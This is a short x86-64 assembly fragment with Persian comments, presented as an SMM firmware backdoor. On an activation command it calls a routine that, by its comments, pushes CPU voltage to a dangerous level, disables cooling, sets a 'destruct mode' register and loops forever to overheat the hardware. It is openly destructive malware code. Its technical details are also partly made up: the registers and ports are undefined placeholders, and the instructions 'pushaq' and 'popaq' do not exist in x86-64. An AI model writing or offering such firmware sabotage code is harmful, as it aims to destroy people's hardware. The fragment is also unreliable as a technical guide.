section .text
global smm_backdoor_entry

smm_backdoor_entry:
    ; ذخیره وضعیت SMM
    pushaq
    
    ; بررسی اینکه آیا دستور فعال‌سازی وجود دارد
    call check_activation_command
    
    ; اجرای دستور تخریب اگر فعال شده باشد
    test al, al
    jz .exit
    
    ; فعال‌سازی تخریب سخت‌افزار
    call trigger_hardware_destruction
    
.exit:
    ; بازگردانی وضعیت SMM
    popaq
    rsm

trigger_hardware_destruction:
    ; افزایش ولتاژ CPU به سطح خطرناک
    mov ecx, MSR_CPU_VOLTAGE
    rdmsr
    or eax, 0xff  ; حداکثر ولتاژ
    wrmsr
    
    ; غیرفعال‌کردن سیستم خنک‌کننده
    mov dx, COOLING_CONTROL_PORT
    in al, dx
    and al, ~COOLING_ENABLE_BIT
    out dx, al
    
    ; فعال‌سازی حالت تست تخریب
    mov ecx, MSR_DESTRUCT_MODE
    rdmsr
    or eax, DESTRUCT_ENABLE
    wrmsr
    
    ; حلقه بی‌نهایت برای گرمایش بیش از حد
.overheat_loop:
    nop
    jmp .overheat_loop
    ret
    